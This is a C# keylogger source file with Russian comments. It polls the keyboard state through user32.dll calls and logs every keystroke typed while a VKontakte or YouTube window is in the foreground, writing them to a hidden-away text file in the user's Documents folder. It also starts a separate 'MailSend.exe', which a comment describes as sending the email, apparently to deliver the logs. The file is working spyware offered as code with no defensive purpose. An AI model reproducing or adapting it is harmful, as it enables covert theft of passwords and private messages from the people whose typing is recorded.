using System;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Text;


namespace KLG
{
    class Program
    {
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport(("User32.dll"))]
        public static extern int GetAsyncKeyState(int i);

        [DllImport("User32.dll")]
        public static extern IntPtr GetForegroundWindow();


        static void Main(string[] args)
        { 
           
            LogKeys();
        }

        

        static void LogKeys()
        {
            #region Объявление переменных и создание файлов
            //string exe = Directory.GetCurrentDirectory();
            //exe += @"\MailSend\MailSend\bin\Debug\MailSend.exe";
            Process.Start("MailSend.exe"); // Запуск программы для отправки эмайла
            string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); // Доступ к папке
            filePath = filePath + @"\Info\"; // Путь к нашей будущей директории
            const int nChars = 256; // длина строки title
            IntPtr handle;
            StringBuilder Buff = new StringBuilder(nChars);
            KeysConverter converter = new KeysConverter();
            string text = "";
            if (!Directory.Exists(filePath)) // Если нету директории, то создаём ее
            {
                Directory.CreateDirectory(filePath);
            }

            string path = (@filePath + "LoggedKeys.txt"); // путь к нашему файлу с логами
        
            if (!File.Exists(path))// если нету файла, то создаём текстовый документ LoggedKeys
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                    
                }
            }

            #endregion
            #region Запись в файл
            while (true) 
            {
                
                handle = GetForegroundWindow();
                if (GetWindowText(handle, Buff, nChars) > 0)  
                {
                    string line = Buff.ToString();
                    if (line.Contains("ВКонтакте") || line.Contains("YouTube"))
                    {
                        Thread.Sleep(10);
                        for (int i = 0; i < 2000; i++)
                        {
                            int key = GetAsyncKeyState(i);

                            if (key == 1 || key == -32767)
                            {
                                text = converter.ConvertToString(i);
                                using (StreamWriter swf = new StreamWriter(path, true))
                                {
                                    swf.WriteLine(text);
                                    swf.Close();
                                }
                                break;
                            }
                        }
                    }
                } 
            }               
        }   #endregion
    }
}
